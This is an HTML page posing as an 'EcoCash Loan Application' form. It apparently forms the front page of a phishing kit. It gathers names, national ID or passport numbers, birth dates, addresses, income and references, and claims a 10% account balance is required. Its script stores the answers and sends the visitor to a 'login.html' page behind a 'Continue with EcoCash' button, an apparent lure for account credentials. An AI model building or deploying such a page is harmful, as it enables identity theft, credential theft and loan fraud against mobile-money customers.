<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash Loan Application</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  :root { --bg:#dfeeff; --card:#ffffff; --muted:#6b7280; --accent:#1766ff; --round:14px; }
  body{font-family:Inter,system-ui,Arial; background:linear-gradient(180deg,#e8f2ff 0%, #cfe6ff 100%); margin:0; padding:48px; display:flex;justify-content:center}
  .wrap{width:100%;max-width:920px}
  .card{background:var(--card); border-radius:var(--round); padding:28px; box-shadow:0 12px 30px rgba(9,30,66,0.06)}
  .header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
  .logo{height:36px}
  h1{color:#1851d3;margin:6px 0 6px;font-size:28px;text-align:center}
  p.lead{color:var(--muted);font-size:13px;text-align:center;margin:0 0 14px}
  .note{background:#fff3cd;border-left:6px solid #ffd84d;padding:10px;border-radius:8px;color:#7a5f00;margin:12px 0}
  form{display:grid;grid-template-columns:1fr 1fr;gap:14px 20px}
  label{display:block;font-size:13px;color:#374151}
  input,select,textarea{width:100%;padding:10px 12px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;box-sizing:border-box}
  textarea{min-height:90px;grid-column:1/3}
  .full{grid-column:1/3}
  .row{display:flex;gap:12px}
  .actions{display:flex;align-items:center;justify-content:space-between;grid-column:1/3;margin-top:10px}
  .btn{background:var(--accent);color:white;padding:12px 18px;border-radius:10px;border:0;font-weight:600;cursor:pointer}
  .small{font-size:12px;color:var(--muted)}
  .checkbox{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted)}
  .right{justify-self:end}
  @media(max-width:800px){form{grid-template-columns:1fr} textarea{grid-column:1} .actions{flex-direction:column;gap:8px}}
</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="header" style="justify-content:center;">
        <!-- Use logo path: copy your logo into repo and use this src -->
        <img src="assets/logo.png" alt="logo" class="logo" onerror="this.style.display='none'">
      </div>

      <h1>EcoCash Loan Application</h1>
      <p class="lead">Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.</p>

      <div class="note">Important: You must have at least <strong>10%</strong> of the loan amount you want in your EcoCash account.</div>

      <form id="loanForm">
        <label>Full Name
          <input name="fullName" required/>
        </label>

        <label>Phone Number
          <input name="phone" required placeholder="+2547..." />
        </label>

        <label>Email Address
          <input name="email" type="email"/>
        </label>

        <label>National ID / Passport
          <input name="nationalId"/>
        </label>

        <label>Date of Birth
          <input name="dob" type="date"/>
        </label>

        <label>Residential Address
          <input name="address"/>
        </label>

        <label>Employment Status
          <select name="employment">
            <option>Employed</option>
            <option>Self-employed</option>
            <option>Unemployed</option>
            <option>Student</option>
          </select>
        </label>

        <label>Employer / Business Name
          <input name="employer"/>
        </label>

        <label>Monthly Income (USD)
          <input name="income" />
        </label>

        <label>Loan Type
          <select name="loanType">
            <option>Personal Loan</option>
            <option>Business Loan</option>
            <option>Emergency Loan</option>
          </select>
        </label>

        <label>Loan Amount (USD)
          <input name="loanAmount" placeholder="e.g. 100" />
        </label>

        <label class="full">Additional Details
          <textarea name="details"></textarea>
        </label>

        <label>Reference Name
          <input name="refName" />
        </label>

        <label>Reference Phone
          <input name="refPhone" />
        </label>

        <label class="full checkbox">
          <input type="checkbox" name="agree" value="yes" /> I confirm that the information provided is true and I agree to the EcoCash Loans terms and conditions.
        </label>

        <div class="actions">
          <div class="small">All fields are secure.</div>
          <div style="display:flex;gap:12px;align-items:center">
            <button id="continueBtn" class="btn">Continue with EcoCash</button>
          </div>
        </div>
      </form>
    </div>
  </div>

<script>
  // When Continue clicked â€” save form data to sessionStorage and redirect to login page
  document.getElementById('loanForm').addEventListener('submit', function(e){
    e.preventDefault();
    const fd = new FormData(e.target);
    const obj = Object.fromEntries(fd.entries());
    // ensure agree checkbox present
    obj.agree = obj.agree || 'no';
    sessionStorage.setItem('loanForm', JSON.stringify(obj));
    // redirect to login page (relative)
    window.location.href = 'login.html';
  });
</script>
</body>
</html>
